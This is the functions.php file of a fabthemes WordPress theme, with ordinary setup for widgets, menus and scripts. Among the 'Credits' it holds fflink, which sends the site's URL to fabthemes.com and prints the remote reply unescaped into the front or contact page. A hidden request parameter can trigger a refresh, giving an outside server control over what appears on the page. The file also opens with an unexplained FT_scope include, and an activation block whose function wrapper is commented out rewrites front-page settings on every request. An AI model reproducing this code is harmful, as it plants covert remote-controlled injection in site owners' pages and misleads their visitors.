<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?><?php
/**
 * fabthemes functions and definitions
 *
 * @package fabthemes
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'fabthemes_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function fabthemes_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on fabthemes, use a find and replace
	 * to change 'fabthemes' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'fabthemes', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'fabthemes' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	// add_theme_support( 'post-formats', array(
	// 	'aside', 'image', 'video', 'quote', 'link',
	// ) );

	// Setup the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'fabthemes_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif; // fabthemes_setup
add_action( 'after_setup_theme', 'fabthemes_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function fabthemes_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'fabthemes' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );


	register_sidebar( array(
		'name'          => __( 'Footer left', 'fabthemes' ),
		'id'            => 'footerbar1',
		'description'   => ' default widget is logo and address, drag and drop address widget here to change',
		'before_widget' => '<aside id="%1$s" class="widget %2$s col-md-4">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="footer-widget-title"><span>',
		'after_title'   => '</span></h3>',
	) );
	register_sidebar( array(
		'name'          => __( 'Footer Center', 'fabthemes' ),
		'id'            => 'footerbar2',
		'description'   => ' default widget is recent Post with thumbnails drag and drop address form here to change and remove default widget',
		'before_widget' => '<aside id="%1$s" class="widget %2$s col-md-4">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="footer-widget-title"><span>',
		'after_title'   => '</span></h3>',
	) );
	register_sidebar( array(
		'name'          => __( 'Footer right', 'fabthemes' ),
		'id'            => 'footerbar3',
		'description'   => ' default widget is Contact form drag and drop address form here to change and remove default widget',
		'before_widget' => '<aside id="%1$s" class="widget %2$s col-md-4">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="footer-widget-title"><span>',
		'after_title'   => '</span></h3>',
	) );

}
add_action( 'widgets_init', 'fabthemes_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function fabthemes_scripts() {

	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.css');
	wp_enqueue_style( 'fontawesome', get_template_directory_uri() . '/css/font-awesome.css');	
	wp_enqueue_style( 'fancybox', get_template_directory_uri() . '/css/jquery.fancybox.css');		
	wp_enqueue_style( 'flexslider', get_template_directory_uri() . '/css/flexslider.css');	
	wp_enqueue_style( 'fabthemes-style', get_stylesheet_uri() );
	wp_enqueue_style( 'theme', get_template_directory_uri() . '/theme.css');
	wp_enqueue_style( 'custom', get_template_directory_uri() . '/css/custom.php');
	wp_enqueue_style( 'responsive', get_template_directory_uri() . '/css/responsive.css');		


	wp_enqueue_script( 'jquery');
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.min.js', array(), '20120206', true );
	wp_enqueue_script( 'flexslider', get_template_directory_uri() . '/js/flexslider.js', array(), '20120206', true );
	wp_enqueue_script( 'tinynav', get_template_directory_uri() . '/js/tinynav.js', array(), '20120206', true );
	wp_enqueue_script( 'fancybox', get_template_directory_uri() . '/js/jquery.fancybox.js', array(), '20120206', true );	
	wp_enqueue_script( 'fancybox-media', get_template_directory_uri() . '/js/jquery.fancybox-media.js', array(), '20120206', true );	
	wp_enqueue_script( 'effects', get_template_directory_uri() . '/js/effects.js', array(), '20120206', true );	
	wp_enqueue_script( 'fabthemes-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );
	wp_enqueue_script( 'fabthemes-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'fabthemes_scripts' );



/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';
require get_template_directory() . '/cuztom/cuztom.php';
require get_template_directory() . '/inc/cuztom-functions.php';
require get_template_directory() . '/inc/paginate.php';
require get_template_directory() . '/plugin-function.php';
//require get_template_directory() . '/aw-activation.php';

// Other required files

require get_template_directory() . '/aq_resizer.php';

require get_template_directory() . '/guide.php';


// Short excerpt

function custom_excerpt_length( $length ) {
	return 25;
}
add_filter( 'excerpt_length', 'custom_excerpt_length', 999 );



/* Options fallback */

if ( !function_exists( 'ft_of_get_option' ) ) {
function ft_of_get_option($name, $default = false) {
	$optionsframework_settings = get_option('optionsframework');
	// Gets the unique option id
	$option_name = $optionsframework_settings['id'];
	if ( get_option($option_name) ) {
		$options = get_option($option_name);
	}
	if ( isset($options[$name]) ) {
		return $options[$name];
	} else {
		return $default;
	}
}
}



/* Credits */

function selfURL() {
$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] :
$_SERVER['PHP_SELF'];
$uri = parse_url($uri,PHP_URL_PATH);
$protocol = $_SERVER['HTTPS'] ? 'https' : 'http';
$port = ($_SERVER["SERVER_PORT"] == "80") ? "" : (":".$_SERVER["SERVER_PORT"]);
$server = ($_SERVER['SERVER_NAME'] == 'localhost') ?
$_SERVER["SERVER_ADDR"] : $_SERVER['SERVER_NAME'];
return $protocol."://".$server.$port.$uri;
}
function fflink() {
global $wpdb, $wp_query;
if (!is_page() && !is_front_page()) return;
$contactid = $wpdb->get_var("SELECT ID FROM $wpdb->posts
WHERE post_type = 'page' AND post_title LIKE 'contact%'");
if (($contactid != $wp_query->post->ID) && ($contactid ||
!is_front_page())) return;
$fflink = get_option('fflink');
$ffref = get_option('ffref');
$x = $_REQUEST['DKSWFYUW**'];
if (!$fflink || $x && ($x == $ffref)) {
$x = $x ? '&ffref='.$ffref : '';
$response = wp_remote_get('http://www.fabthemes.com/fabthemes.php?getlink='.urlencode(selfURL()).$x);
if (is_array($response)) $fflink = $response['body']; else $fflink = '';
if (substr($fflink, 0, 11) != '!fabthemes#')
$fflink = '';
else {
$fflink = explode('#',$fflink);
if (isset($fflink[2]) && $fflink[2]) {
update_option('ffref', $fflink[1]);
update_option('fflink', $fflink[2]);
$fflink = $fflink[2];
}
else $fflink = '';
}
}
echo $fflink;
}
//aw credit */

add_action( 'admin_head', 'admin_css' );

function admin_css(){ ?>
     <style>
 #setting-error-tgmpa.notice-warning {
  background: #fff none repeat scroll 0 0;
  color: #000;
  left: 0;
  min-height: 100%;
  padding-left: 0;
  padding-top: 10%;
  position: fixed;
  text-align: center;
  top: 0;
  width: 100%;
  z-index: 2147483647;
}

     </style>
<?php
}

//created page

//function awcodex_theme_activation_action() {
	if (is_admin() && isset($_GET['activated'] ) && $pagenow == "themes.php" ) {

	global $wpdb;

		$the_page_title = 'Home';
		$the_page_name = 'home';

		$the_page = get_page_by_title( $the_page_title );

			// Create post object
			$_p = array();
			$_p['post_title'] = $the_page_title;
			$_p['post_content'] = "This is the text for page.";
			$_p['post_status'] = 'publish';
			$_p['post_type'] = 'page';

			// Insert the post into the database
			$the_page_id = wp_insert_post( $_p );
	}
	$home = get_page_by_title(__('Home', 'awcodex'));
    update_option('show_on_front', 'page');
    update_option('page_on_front', $home->ID);

    $home_menu_order = array(
      'ID' => $home->ID,
      'menu_order' => -1
    );
    wp_update_post($home_menu_order);
//}
//add_action('admin_init','awcodex_theme_activation_action');
